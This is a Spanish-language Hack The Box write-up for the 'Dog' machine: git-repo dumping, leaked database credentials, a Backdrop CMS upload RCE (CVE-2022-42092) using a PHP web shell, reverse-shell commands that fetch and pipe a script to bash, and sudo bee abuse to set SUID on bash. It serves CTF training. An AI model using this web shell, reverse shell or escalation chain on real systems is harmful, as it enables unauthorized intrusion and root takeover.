Dog - Write-up de Hack The Box
Introducción a la Máquina Dog
OS: Linux
Dificultad: Fácil
Puntos: 20
Fecha de Lanzamiento: 08 Mar 2025

Esta máquina, "Dog," es un CTF fácil que involucra la enumeración de un repositorio Git expuesto en un servicio web, la explotación de una vulnerabilidad de carga de archivos arbitrarios en Backdrop CMS, y la escalada de privilegios a través de una entrada sudo mal configurada para la herramienta bee.

1. Escaneo de Puertos (Nmap)
El primer paso es siempre un escaneo de Nmap para descubrir qué puertos están abiertos y qué servicios se están ejecutando.

nmap -sC -sV -oA nmap/dog 10.10.11.58

Resultados del Nmap:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

El escaneo revela que los puertos 22 (SSH) y 80 (HTTP) están abiertos. El puerto 80 es nuestro objetivo principal para la enumeración web.

2. Enumeración Web (HTTP - Apache)
Accedimos a la página web en http://10.10.11.58/. La página de inicio muestra un sitio de "Dog" con el título "Welcome to Dog!" y menciona "Dog obesity" con la indicación "Mon, 15/07/2024 - 7:51pm by dogfBackDropSystem". Esto sugiere que el sitio podría estar ejecutándose en Backdrop CMS.

Descubrimiento de un Repositorio Git Expuesto
Una revisión del Nmap detallado (no mostrado en el PDF, pero implicado por el contexto) o un dirb/gobuster reveló un directorio .git expuesto:

http-git: Git repository found

Esto es un hallazgo crítico. Un repositorio Git expuesto a menudo permite descargar el código fuente, lo que puede revelar credenciales, vulnerabilidades o información sensible.

Descargando el Repositorio Git:

Utilizamos git-dumper para descargar el contenido del repositorio Git expuesto.

git-dumper http://10.10.11.58/.git/ dog_html/

(Nota: El PDF muestra http://10.10.11.58/.git/dog_htb/ como ejemplo, pero la URL correcta para descargar la raíz del repositorio sería http://10.10.11.58/.git/)

Analizando el Código Fuente - Credenciales de la Base de Datos
Una vez descargado el repositorio, exploramos los archivos. Encontramos el archivo de configuración de la base de datos: settings.php.

// File: settings.php
<?php

// Main Backdrop CMS configuration file

// Database configuration
//
// Test sites can configure their database by entering the connection string
// below. If using replica databases or multiple connections, see the
// advanced database documentation.
// https://api.backdropcms.org/database-configuration
$database = 'mysql://root:BackDropJ2024052824@127.0.0.1/hackdrop';
$database_prefix = '';
?>

¡Excelente! Hemos encontrado las credenciales de la base de datos:

Usuario: root

Contraseña: BackDropJ2024052824

Descubrimiento de Nombre de Usuario (tiffany@dog.htb)
El PDF también menciona buscar el nombre de dominio revelado por Nmap (dog.htb) dentro de la carpeta principal y luego obtener un nombre de usuario. El comando grep sugerido fue:

grep -r "dog.htb" .

Esto llevó al descubrimiento del usuario tiffany@dog.htb.

3. Acceso al Panel de Administración de Backdrop CMS
Ahora, con el nombre de usuario (tiffany) y la contraseña (BackDropJ2024052824) descubiertos, intentamos iniciar sesión en el panel de administración de Backdrop CMS.

URL de Acceso: http://10.10.11.58/user/login (o similar)

La autenticación fue exitosa, y obtuvimos acceso al Dashboard de Backdrop CMS.

4. Explotación de RCE (Remote Code Execution) - CVE-2022-42092
El siguiente paso es buscar vulnerabilidades en Backdrop CMS. Una búsqueda rápida revela CVE-2022-42092, que describe una vulnerabilidad de carga de archivos sin restricciones en Backdrop CMS 1.22.0 a través de la sección 'themes' que permite la ejecución remota de código (RCE).

Para explotar esto, necesitamos dos archivos:

shell.info: Un archivo de información para el módulo/tema que engaña a CMS.

shell.php: El shell PHP que nos permitirá ejecutar comandos.

Contenido de shell.info:

; File: shell.info
type = module
name = Shell
description = Controls the visual building blocks a page is constructed with. Blocks are boxes of content rendered into an area, or region, of a web page.
package = Layouts
tags[] = Blocks
tags[] = Site Architecture
version = BACKDROP_VERSION
backdrop = 1.x
configure = admin/structure/block
; Information added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1789862662

Contenido de shell.php (shell simple de comando):

; File: shell.php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
  system($_GET['cmd']);
}
?>
</pre>
</body>
</html>

Pasos de Explotación:

Crear un archivo .tar: Colocamos shell.info y shell.php dentro de una carpeta (ej. shell/) y luego la comprimimos en un archivo .tar (ej. shell.tar).

Cargar el archivo: Navegamos a la sección de carga de módulos/temas en Backdrop CMS.

URL: http://10.10.11.58/admin/modules/install (o similar, en el menú Configuration -> Install projects).

Subimos shell.tar a través de la opción "Upload a module, theme, or layout archive to install".

Confirmar Carga: El CMS reportará "Installation was completed successfully".

Encontrar el Shell Cargado
Después de la carga, necesitamos encontrar dónde se guardó el shell. El PDF indica que se realizó un "fuzzing" (enumeración de directorios/archivos) con Gobuster.

gobuster dir -u http://10.10.11.58/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php

El fuzzing reveló el directorio modules/, y dentro de él, pudimos acceder a nuestro shell:

URL del Shell: http://10.10.11.58/modules/shell/shell.php

Pudimos ejecutar comandos a través del parámetro cmd, por ejemplo, http://10.10.11.58/modules/shell/shell.php?cmd=whoami.

Usuario inicial: www-data

Estableciendo una Reverse Shell
La máquina "Dog" tiene un script que borra los archivos cargados, por lo que una shell interactiva es crucial. Configuramos un servidor HTTP local y un oyente netcat para obtener una reverse shell.

En la máquina del atacante (Kali/Parrot):

Inicia un oyente de Netcat:

nc -lvnp 4444

Inicia un servidor HTTP simple para servir el script de reverse shell:

python3 -m http.server 5555

Desde el shell web en Dog:

Descargamos y ejecutamos un script de reverse shell. En este caso, usamos curl para descargar un script bash y ejecutarlo. El script bash contiene la siguiente línea:

bash -i & /dev/tcp/10.10.14.40/4444 0>&1

Donde 10.10.14.40 es la IP de tu máquina de atacante.

Comando en el shell web:

curl 10.10.14.40:5555 | bash

O directamente:

bash -c "bash -i >& /dev/tcp/10.10.14.40/4444 0>&1"

¡Recibimos una shell de www-data en nuestro oyente de Netcat!

5. Escalada de Privilegios
Una vez como www-data, enumeramos los usuarios en el sistema.

www-data@dog:/var/www/html/modules/shell$ ls -l /home
total 8
drwxr-xr-x 2 jobert jobert 4096 Apr 20 2025 jobert
drwxr-xr-x 2 johncusack johncusack 4096 Apr 20 2025 johncusack

Encontramos los usuarios jobert y johncusack.

Recordando la contraseña BackDropJ2024052824 que encontramos para root de la base de datos, intentamos usarla para su a johncusack.

www-data@dog:/home$ su johncusack
Password: BackDropJ2024052824
johncusack@dog:/home$

¡Éxito! Hemos cambiado al usuario johncusack.

Escalada a Root con sudo y bee
Como johncusack, verificamos los permisos de sudo:

johncusack@dog:~$ sudo -l
[sudo] password for johncusack: BackDropJ2024052824
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```johncusack` puede ejecutar `/usr/local/bin/bee` como cualquier usuario (ALL) y como root (ALL), sin requerir una contraseña adicional si ya está autenticado como `johncusack`.

La herramienta `bee` es un ejecutable para Backdrop CMS que permite evaluar código PHP. Podemos usar su subcomando `php-eval` para ejecutar código PHP arbitrario como `root`.

```bash
johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("whoami")'
root

¡Bingo! Hemos ejecutado whoami como root.

Para obtener una shell de root persistente, podemos usar bee para establecer el bit SUID en /bin/bash. El bit SUID permite que un ejecutable se ejecute con los permisos del propietario del archivo (en este caso, root), en lugar del usuario que lo ejecuta.

johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html php-eval 'system("chmod u+s /bin/bash")'
johncusack@dog:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash

El s en los permisos (-rwsr-xr-x) confirma que el bit SUID está configurado.

Ahora, simplemente ejecutamos bash -p (donde -p le dice a bash que use los permisos efectivos del archivo, es decir, root).

johncusack@dog:~$ bash -p
bash-5.0# whoami
root

¡Somos root!

Conclusión
La máquina "Dog" fue un excelente CTF que abarcó una variedad de vectores de ataque:

Información Sensible Expuesta: Enumeración de un repositorio Git para encontrar credenciales.

Vulnerabilidad en Aplicación Web: Explotación de RCE en Backdrop CMS (CVE-2022-42092) a través de la carga de archivos.

Gestión de Shell: Obtención y persistencia de una reverse shell a pesar de la eliminación de archivos.

Escalada de Privilegios: Uso de credenciales reutilizadas y un permiso sudo mal configurado para bee para obtener acceso root.

Esta máquina resalta la importancia de la higiene del código, la gestión de la configuración (especialmente de los permisos de sudo) y el monitoreo de vulnerabilidades en aplicaciones web.

Descargo de responsabilidad: Este write-up se proporciona únicamente con fines educativos y de concienciación sobre ciberseguridad. Cualquier intento de replicar estas técnicas en sistemas sin autorización expresa es ilegal y poco ético. Realice pruebas de penetración solo en entornos controlados y con el permiso adecuado.